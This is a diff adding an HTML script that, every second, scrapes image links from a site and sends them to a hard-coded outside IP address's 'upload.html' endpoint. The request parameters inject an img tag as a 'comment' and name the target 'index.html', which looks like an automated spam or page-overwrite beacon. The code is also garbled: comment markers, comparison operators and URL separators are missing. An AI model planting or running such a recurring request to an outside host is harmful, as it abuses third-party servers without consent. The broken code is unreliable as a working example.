@@ -1,0 +1,57 @@
+<script>
+function scrapeImageLink() {
+     Replace 'SPECIFIED_WEBSITE_URL' with the actual URL of the website you want to scrape
+    const websiteUrl = 'www.google.ca';
+
+     Make a request to the specified website
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', websiteUrl, true);
+
+    xhr.onload = function () {
+        if (xhr.status = 200 && xhr.status  300) {
+             Extract image links using a simple regular expression
+            const regex = img[^]+src=[']([^']+)[']g;
+            const matches = [...xhr.responseText.matchAll(regex)];
+
+            if (matches.length  0) {
+                 Get a random image link from the matches
+                const randomIndex = Math.floor(Math.random()  matches.length);
+                const randomImageLink = matches[randomIndex][1];
+
+                 Construct the full URL for the request
+                const fullUrl = `http24.222.242.93upload.htmlcomment=img src=${randomImageLink}&name=index.html`;
+
+                 Send a GET request to the server
+                const request = new XMLHttpRequest();
+                request.open('GET', fullUrl, true);
+
+                request.onload = function () {
+                    if (request.status = 200 && request.status  300) {
+                         Process the response if needed
+                        console.log('Response', request.responseText);
+                    } else {
+                        console.error('Request failed with status', request.status);
+                    }
+                };
+
+                request.onerror = function () {
+                    console.error('Request failed');
+                };
+
+                request.send();
+            }
+        } else {
+            console.error('Request failed with status', xhr.status);
+        }
+    };
+
+    xhr.onerror = function () {
+        console.error('Request failed');
+    };
+
+    xhr.send();
+}
+
+ Send a request every second (1000 milliseconds)
+setInterval(scrapeImageLink, 1000);
+</script>
